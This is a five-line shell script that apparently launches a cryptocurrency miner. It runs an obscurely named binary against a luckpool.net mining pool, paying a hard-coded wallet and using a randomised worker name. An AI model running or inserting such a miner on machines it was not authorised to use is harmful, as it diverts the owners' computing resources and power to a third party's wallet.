chmod 777 sotobabat
PULL=na.luckpool.net:3956
WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
./sotobabat -v -l $PULL -u $WUL.$WOR -p x -t 4
